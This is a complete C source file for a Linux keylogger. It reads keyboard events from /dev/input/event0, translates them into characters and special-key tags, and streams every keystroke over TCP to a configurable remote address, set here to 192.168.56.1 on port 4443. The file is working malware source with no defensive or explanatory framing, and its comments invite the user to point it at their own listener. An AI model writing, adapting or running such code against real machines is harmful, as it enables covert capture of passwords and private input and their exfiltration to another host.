#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <linux/input.h>

static char resolve_key(__u16 code, bool shift, bool caps) {
    bool upper = shift ^ caps; 

    switch (code) {
        case KEY_A: return upper ? 'A' : 'a';
        case KEY_B: return upper ? 'B' : 'b';
        case KEY_C: return upper ? 'C' : 'c';
        case KEY_D: return upper ? 'D' : 'd';
        case KEY_E: return upper ? 'E' : 'e';
        case KEY_F: return upper ? 'F' : 'f';
        case KEY_G: return upper ? 'G' : 'g';
        case KEY_H: return upper ? 'H' : 'h';
        case KEY_I: return upper ? 'I' : 'i';
        case KEY_J: return upper ? 'J' : 'j';
        case KEY_K: return upper ? 'K' : 'k';
        case KEY_L: return upper ? 'L' : 'l';
        case KEY_M: return upper ? 'M' : 'm';
        case KEY_N: return upper ? 'N' : 'n';
        case KEY_O: return upper ? 'O' : 'o';
        case KEY_P: return upper ? 'P' : 'p';
        case KEY_Q: return upper ? 'Q' : 'q';
        case KEY_R: return upper ? 'R' : 'r';
        case KEY_S: return upper ? 'S' : 's';
        case KEY_T: return upper ? 'T' : 't';
        case KEY_U: return upper ? 'U' : 'u';
        case KEY_V: return upper ? 'V' : 'v';
        case KEY_W: return upper ? 'W' : 'w';
        case KEY_X: return upper ? 'X' : 'x';
        case KEY_Y: return upper ? 'Y' : 'y';
        case KEY_Z: return upper ? 'Z' : 'z';

        case KEY_1: return shift ? '!' : '1';
        case KEY_2: return shift ? '@' : '2';
        case KEY_3: return shift ? '#' : '3';
        case KEY_4: return shift ? '$' : '4';
        case KEY_5: return shift ? '%' : '5';
        case KEY_6: return shift ? '^' : '6';
        case KEY_7: return shift ? '&' : '7';
        case KEY_8: return shift ? '*' : '8';
        case KEY_9: return shift ? '(' : '9';
        case KEY_0: return shift ? ')' : '0';

        case KEY_MINUS:      return shift ? '_' : '-';
        case KEY_EQUAL:      return shift ? '+' : '=';
        case KEY_LEFTBRACE:  return shift ? '{' : '[';
        case KEY_RIGHTBRACE: return shift ? '}' : ']';
        case KEY_SEMICOLON:  return shift ? ':' : ';';
        case KEY_APOSTROPHE: return shift ? '"' : '\'';
        case KEY_GRAVE:      return shift ? '~' : '`';
        case KEY_BACKSLASH:  return shift ? '|' : '\\';
        case KEY_COMMA:      return shift ? '<' : ',';
        case KEY_DOT:        return shift ? '>' : '.';
        case KEY_SLASH:      return shift ? '?' : '/';

        case KEY_KPSLASH:    return '/';
        case KEY_KPASTERISK: return '*';
        case KEY_KPMINUS:    return '-';
        case KEY_KPPLUS:     return '+';
        case KEY_KPEQUAL:    return '=';
        case KEY_KP0:        return '0';
        case KEY_KP1:        return '1';
        case KEY_KP2:        return '2';           
        case KEY_KP3:        return '3';
        case KEY_KP4:        return '4';
        case KEY_KP5:        return '5';
        case KEY_KP6:        return '6';
        case KEY_KP7:        return '7';
        case KEY_KP8:        return '8';
        case KEY_KP9:        return '9';
        case KEY_KPDOT:      return '.';

        case KEY_SPACE:  return ' ';
        case KEY_TAB:    return '\t';
        case KEY_ENTER:
        case KEY_KPENTER: return '\n';
        default: return 0;
    }
}


static const char *special_key_name(__u16 code) {
    switch (code) {
        case KEY_ESC: return "[ESC]";
        case KEY_BACKSPACE: return "[BACKSPACE]";
        case KEY_LEFTCTRL:
        case KEY_RIGHTCTRL: return NULL; // modifier, silent
        case KEY_LEFTSHIFT:
        case KEY_RIGHTSHIFT: return NULL;
        case KEY_LEFTALT:
        case KEY_RIGHTALT: return "[ALT]";
        case KEY_CAPSLOCK: return "[CAPS]";
        case KEY_F1: return "[F1]";
        case KEY_F2: return "[F2]";
        case KEY_F3: return "[F3]";
        case KEY_F4: return "[F4]";
        case KEY_F5: return "[F5]";
        case KEY_F6: return "[F6]";
        case KEY_F7: return "[F7]";
        case KEY_F8: return "[F8]";
        case KEY_F9: return "[F9]";
        case KEY_F10: return "[F10]";
        case KEY_F11: return "[F11]";
        case KEY_F12: return "[F12]";
        case KEY_UP: return "[UP]";
        case KEY_DOWN: return "[DOWN]";
        case KEY_LEFT: return "[LEFT]";
        case KEY_RIGHT: return "[RIGHT]";
        case KEY_DELETE: return "[DEL]";
        case KEY_HOME: return "[HOME]";
        case KEY_END: return "[END]";
        case KEY_PAGEUP: return "[PGUP]";
        case KEY_PAGEDOWN: return "[PGDN]";
        case KEY_INSERT: return "[INS]";
        default: return "[?]";
    }
}


int main() {
    int port = 4443;        // change this to your desired port number
    struct sockaddr_in revsockaddr;

    
    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("192.168.56.1");       // change this to your desired IP address

    if (connect(sockt, (struct sockaddr *)&revsockaddr, sizeof(revsockaddr)) < 0) {
        perror("connect");
        return 1;
    }

    /* Wrap socket in FILE* so we can use fputc/fputs */
    FILE *sock = fdopen(sockt, "w");
    if (!sock) {
        perror("fdopen");
        close(sockt);
        return 1;
    }


    printf("Keylogger started\n");
    int fd = open("/dev/input/event0", O_RDONLY , 0);
    if (fd == -1) {
        perror("Error opening file");
        exit(EXIT_FAILURE);
    }


    struct input_event ie;
    bool left_shift = false, right_shift = false, caps = false;

    while (1) {

        read(fd, &ie, sizeof(ie));
        if (ie.type != EV_KEY)
            continue;

        // Track modifier state on both press (1), autorepeat (2) and release (0)
        if (ie.code == KEY_LEFTSHIFT)
            left_shift = (ie.value != 0);
        else if (ie.code == KEY_RIGHTSHIFT)
            right_shift = (ie.value != 0);
        else if (ie.code == KEY_CAPSLOCK && ie.value == 1)
            caps = !caps;


        if (ie.value != 1 && ie.value != 2)
            continue;
        
            
        if (ie.code == KEY_LEFTSHIFT || ie.code == KEY_RIGHTSHIFT ||
            ie.code == KEY_CAPSLOCK)
            continue;    


        bool shift = left_shift || right_shift;
        char c = resolve_key(ie.code, shift, caps);
        if (c) {
            fputc(c, sock);
        } else {
            const char *name = special_key_name(ie.code);
            if (name)
                fputs(name, sock);
        }
        fflush(sock);            

    }
    
    close(fd);
    fclose(sock);
    return 0;

}
